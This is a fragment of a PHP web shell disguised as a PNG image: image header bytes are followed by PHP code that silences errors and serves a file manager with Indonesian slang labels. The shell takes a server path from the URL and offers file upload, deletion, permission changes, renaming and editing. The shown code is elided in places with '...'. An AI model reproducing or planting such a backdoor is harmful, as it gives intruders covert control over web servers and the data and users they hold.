‰PNG
IHDRZ#|sRGBgAMAIDATx^í½˜Våyï;çÚ§3-Ô°)›]*±ÑšŒVwÂÞFO­^ç¸M¯ÒxreˆÑ^ÖTÜF±üapHYsQG46†dO£E
<?php
error_reporting(0);
set_time_limit(0);
...
<title>‰PNG
IHDRZ#|sRGBgAMAIDATx^í½˜Våyï;çÚ§3-Ô°)›]*±ÑšŒVwÂÞFO­^ç¸M¯ÒxreˆÑ^ÖTÜF±üapHYsQG46†dO£E</title>
<style>
body{
...
<tr><td><font color="white">Wadadaw lagi di :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
<font color="white">Wadadaw mau up :</font> <input type="file" name="file" />
...
<tr class="first">
<td><center>Sokap</peller></center></td>
<td><center>Berapa</peller></center></td>
<td><center>Ijin</peller></center></td>
<td><center>Apain ya</peller></center></td>
</tr>';
...
<option value="delete">Tenggelamkan</option>
<option value="chmod">Ganti ijin</option>
...
<option value="chmod">Ganti ijin</option>
<option value="rename">Ubah nama</option>
<option value="edit">Ubah isi</option>
</select>
